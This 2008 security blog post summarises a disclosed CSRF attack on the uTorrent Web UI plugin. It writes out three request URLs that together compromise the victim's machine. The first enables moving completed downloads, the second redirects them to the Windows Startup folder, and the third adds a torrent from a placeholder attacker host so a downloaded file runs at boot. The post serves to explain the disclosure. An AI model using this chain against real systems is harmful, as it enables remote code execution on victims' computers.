---
title: Own a box via CSRF
author: rd
excerpt: |
  |
    You get bored of CSRF issues every day? Now this is one is a bit more interesting
layout: post
shorturls:
  - 'a:4:{s:9:"permalink";s:54:"https://www.vnsecurity.net/2008/05/own-a-box-via-csrf/";s:7:"tinyurl";s:26:"http://tinyurl.com/y85vhb2";s:4:"isgd";s:18:"http://is.gd/aOtiy";s:5:"bitly";s:20:"http://bit.ly/7yIvLT";}'
tweetcount:
  - 1
twittercomments:
  - 'a:1:{i:10730529254;s:7:"retweet";}'
tweetbackscheck:
  - 1408359013
category:
  - tutorials
---
Rob Carter has posted a blog on how to [pwn a box via a pure CSRF bug][1] of a uTorrent plugin. When a user installs the uTorrent Web UI plugin, the plugin starts a locally running web server on your machine. Basically, his CSRF exploit force uTorrent to move completed downloads to an arbitrary directory on their system, download arbitrary torrents, and completely own their box. </p> 

*   The first CSRF to turn on the “Move completed downloads” option on the uTorrent Web UI. http://localhost:14774/gui/?action=setsetting&s=dir\_completed\_download_flag&v=1 

*   The second CSRF to change the path of where the completed torrent download is placed. For example:</p> 
    http://localhost:14774/gui/?action=setsetting&s=dir\_completed\_download&v=C:
    
    Documents%20and%20SettingsAll%20UsersStart%20MenuProgramsStartup </li> </ul> 
    *   The last CSRF is to force the victim to download a torrent which points to an attacker controlled file. Once the file is downloaded via torrent, uTorrent places the files into startup folder and automatically run the file in the next windows boot.</p> 
        http://localhost:14774/gui/?action=add-url&s=http://www.attacker.com/file.torrent

 [1]: http://r00tin.blogspot.com/2008/04/utorrent-pwn3d.html